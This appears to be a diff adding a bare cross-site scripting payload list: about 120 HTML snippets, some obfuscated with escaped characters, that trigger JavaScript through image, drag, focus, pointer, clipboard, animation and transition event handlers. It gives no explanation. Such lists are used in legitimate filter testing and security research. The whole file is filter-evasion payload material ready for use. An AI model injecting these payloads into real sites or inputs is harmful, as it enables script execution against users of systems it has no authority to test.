@@ -1,0 +1,120 @@
+<svg onload=innerHTML='\74img/src/onerror\75alert\501\51\76'>
+<svg onload=a='\51\76',b='t\501',i='\74img/src/one',m='rror\75aler',innerHTML=i+m+b+a>
+<div draggable=\"true\" contenteditable>drag me</div><img ondragover=alert(2025) contenteditable>drop here</img>
+<div draggable=\"true\" contenteditable>drag me</div><img ondrop=alert(2026) contenteditable>drop here</img>
+<div draggable=\"true\" contenteditable>drag me</div><img2 ondragover=alert(2027) contenteditable>drop here</img2>
+<div draggable=\"true\" contenteditable>drag me</div><img2 ondrop=alert(2028) contenteditable>drop here</img2>
+<img draggable=\"true\" ondrag=\"alert(3309)\">test</img>
+<img draggable=\"true\" ondragend=\"alert(3310)\">test</img>
+<img draggable=\"true\" ondragenter=\"alert(3311)\">test</img>
+<img draggable=\"true\" ondragleave=\"alert(3312)\">test</img>
+<img draggable=\"true\" ondragstart=\"alert(3313)\">test</img>
+<img id=x tabindex=3314 onactivate=alert(3314)></img>
+<img id=x tabindex=3315 onbeforeactivate=alert(3315)></img>
+<img id=x tabindex=3316 onbeforedeactivate=alert()></img><input autofocus>
+<img id=x tabindex=3317 ondeactivate=alert()></img><input id=y autofocus>
+<img id=x tabindex=3318 onfocus=alert(3318)></img>
+<img id=x tabindex=3319 onfocusin=alert(3319)></img>
+<img onafterscriptexecute=alert(3320)><script>3320</script>
+<img onbeforecopy=\"alert(3321)\" contenteditable>test</img>
+<img onbeforecut=\"alert(3322)\" contenteditable>test</img>
+<img onbeforepaste=\"alert(3323)\" contenteditable>test</img>
+<img onbeforescriptexecute=alert(3324)><script>3324</script>
+<img onblur=alert(3325) tabindex=3325 id=x></img><input autofocus>
+<img onclick=\"alert(3326)\">test</img>
+<img oncontextmenu=\"alert(3327)\">test</img>
+<img oncopy=alert(3328) value=\"XSS\" autofocus tabindex=3328>test
+<img oncut=alert(3329) value=\"XSS\" autofocus tabindex=3329>test
+<img ondblclick=\"alert(3330)\" autofocus tabindex=3330>test</img>
+<img onfocusout=alert(3331) tabindex=3331 id=x></img><input autofocus>
+<img onkeydown=\"alert(3332)\" contenteditable>test</img>
+<img onkeypress=\"alert(3333)\" contenteditable>test</img>
+<img onkeyup=\"alert(3334)\" contenteditable>test</img>
+<img onmousedown=\"alert(3335)\">test</img>
+<img onmouseenter=\"alert(3336)\">test</img>
+<img onmouseleave=\"alert(3337)\">test</img>
+<img onmousemove=\"alert(3338)\">test</img>
+<img onmouseout=\"alert(3339)\">test</img>
+<img onmouseover=\"alert(3340)\">test</img>
+<img onmouseup=\"alert(3341)\">test</img>
+<img onmousewheel=alert(3342)>requires scrolling
+<img onpaste=\"alert(3343)\" contenteditable>test</img>
+<img onpointerdown=alert(3344)>XSS</img>
+<img onpointerenter=alert(3345)>XSS</img>
+<img onpointerleave=alert(3346)>XSS</img>
+<img onpointermove=alert(3347)>XSS</img>
+<img onpointerout=alert(3348)>XSS</img>
+<img onpointerover=alert(3349)>XSS</img>
+<img onpointerrawupdate=alert(3350)>XSS</img>
+<img onpointerup=alert(3351)>XSS</img>
+<img src/onerror=alert(3352)>
+<img src=validimage.png onload=alert(3353)>
+<img src=validimage.png onloadend=alert(3354)>
+<img src=validimage.png onloadstart=alert(3355)>
+<img srcset=3356 onerror=alert(3356)>
+<img srcset=validimage.png onload=alert(3357)>
+<img usemap=#x><map name=\"x\"><area href onfocus=alert(3358) id=x>
+<img usemap=#x><map name=\"x\"><area href onfocusin=alert(3359) id=x>
+<img2 draggable=\"true\" ondrag=\"alert(3360)\">test</img2>
+<img2 draggable=\"true\" ondragend=\"alert(3361)\">test</img2>
+<img2 draggable=\"true\" ondragenter=\"alert(3362)\">test</img2>
+<img2 draggable=\"true\" ondragleave=\"alert(3363)\">test</img2>
+<img2 draggable=\"true\" ondragstart=\"alert(3364)\">test</img2>
+<img2 id=x tabindex=3365 onactivate=alert(3365)></img2>
+<img2 id=x tabindex=3366 onbeforeactivate=alert(3366)></img2>
+<img2 id=x tabindex=3367 onbeforedeactivate=alert()></img2><input autofocus>
+<img2 id=x tabindex=3368 ondeactivate=alert()></img2><input id=y autofocus>
+<img2 onafterscriptexecute=alert(3369)><script>3369</script>
+<img2 onbeforescriptexecute=alert(3370)><script>3370</script>
+<img2 onclick=\"alert(3371)\">test</img2>
+<img2 oncontextmenu=\"alert(3372)\">test</img2>
+<img2 oncopy=alert(3373) value=\"XSS\" autofocus tabindex=3373>test
+<img oncut=alert(3374) value=\"XSS\" autofocus tabindex=3374>test
+<img2 ondblclick=\"alert(3375)\" autofocus tabindex=3375>test</img2>
+<img2 onkeydown=\"alert(3376)\" contenteditable>test</img2>
+<img2 onkeypress=\"alert(3377)\" contenteditable>test</img2>
+<img2 onkeyup=\"alert(3378)\" contenteditable>test</img2>
+<img2 onmousedown=\"alert(3379)\">test</img2>
+<img2 onmouseenter=\"alert(3380)\">test</img2>
+<img2 onmouseleave=\"alert(3381)\">test</img2>
+<img2 onmousemove=\"alert(3382)\">test</img2>
+<img2 onmouseout=\"alert(3383)\">test</img2>
+<img2 onmouseover=\"alert(3384)\">test</img2>
+<img2 onmouseup=\"alert(3385)\">test</img2>
+<img2 onmousewheel=alert(3386)>requires scrolling
+<img2 onpointerdown=alert(3387)>XSS</img2>
+<img2 onpointerenter=alert(3388)>XSS</img2>
+<img2 onpointerleave=alert(3389)>XSS</img2>
+<img2 onpointermove=alert(3390)>XSS</img2>
+<img2 onpointerout=alert(3391)>XSS</img2>
+<img2 onpointerover=alert(3392)>XSS</img2>
+<img2 onpointerrawupdate=alert(3393)>XSS</img2>
+<img2 onpointerup=alert(3394)>XSS</img2>
+<picture><source srcset=\"validimage.png\"><img onload=alert(4949)></picture>
+<picture><source srcset=\"validimage.png\"><img onloadend=alert(4950)></picture>
+<picture><source srcset=\"validimage.png\"><img onloadstart=alert(4951)></picture>
+<style>:target {color: red;}</style><img id=x style=\"transition:color 60520s\" ontransitioncancel=alert()></img>
+<style>:target {color: red;}</style><img2 id=x style=\"transition:color 60530s\" ontransitioncancel=alert()></img2>
+<style>:target {color:red;}</style><img id=x style=\"transition:color 6348s\" ontransitionend=alert(6348)></img>
+<style>:target {color:red;}</style><img id=x style=\"transition:color 6349s\" ontransitionstart=alert(6349)></img>
+<style>:target {color:red;}</style><img id=x style=\"transition:color 6350s\" onwebkittransitionend=alert(6350)></img>
+<style>:target {color:red;}</style><img2 id=x style=\"transition:color 6351s\" ontransitionend=alert(6351)></img2>
+<style>:target {color:red;}</style><img2 id=x style=\"transition:color 6352s\" ontransitionstart=alert(6352)></img2>
+<style>:target {color:red;}</style><img2 id=x style=\"transition:color 6353s\" onwebkittransitionend=alert(6353)></img2>
+<style>:target {transform: rotate(667680deg);}</style><img id=x style=\"transition:transform 2s\" ontransitionrun=alert()></img>
+<style>:target {transform: rotate(667780deg);}</style><img2 id=x style=\"transition:transform 2s\" ontransitionrun=alert()></img2>
+<style>@keyframes slidein {}</style><img style=\"animation-duration:6902s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(6902)\"></img>
+<style>@keyframes slidein {}</style><img style=\"animation-duration:6903s;animation-name:slidein;animation-iteration-count:2\" onwebkitanimationiteration=\"alert(6903)\"></img>
+<style>@keyframes slidein {}</style><img2 style=\"animation-duration:6904s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(6904)\"></img2>
+<style>@keyframes slidein {}</style><img2 style=\"animation-duration:6905s;animation-name:slidein;animation-iteration-count:2\" onwebkitanimationiteration=\"alert(6905)\"></img2>
+<style>@keyframes x{from {left:0;}to {left: 7144000px;}}:target {animation:71440s ease-in-out 0s 7144 x;}</style><img id=x style=\"position:absolute;\" onanimationcancel=\"alert()\"></img>
+<style>@keyframes x{from {left:0;}to {left: 7145000px;}}:target {animation:71450s ease-in-out 0s 7145 x;}</style><img2 id=x style=\"position:absolute;\" onanimationcancel=\"alert()\"></img2>
+<style>@keyframes x{}</style><img style=\"animation-name:x\" onanimationend=\"alert(7510)\"></img>
+<style>@keyframes x{}</style><img style=\"animation-name:x\" onanimationstart=\"alert(7511)\"></img>
+<style>@keyframes x{}</style><img style=\"animation-name:x\" onwebkitanimationend=\"alert(7512)\"></img>
+<style>@keyframes x{}</style><img style=\"animation-name:x\" onwebkitanimationstart=\"alert(7513)\"></img>
+<style>@keyframes x{}</style><img2 style=\"animation-name:x\" onanimationend=\"alert(7514)\"></img2>
+<style>@keyframes x{}</style><img2 style=\"animation-name:x\" onanimationstart=\"alert(7515)\"></img2>
+<style>@keyframes x{}</style><img2 style=\"animation-name:x\" onwebkitanimationend=\"alert(7516)\"></img2>
+<style>@keyframes x{}</style><img2 style=\"animation-name:x\" onwebkitanimationstart=\"alert(7517)\"></img2>
+
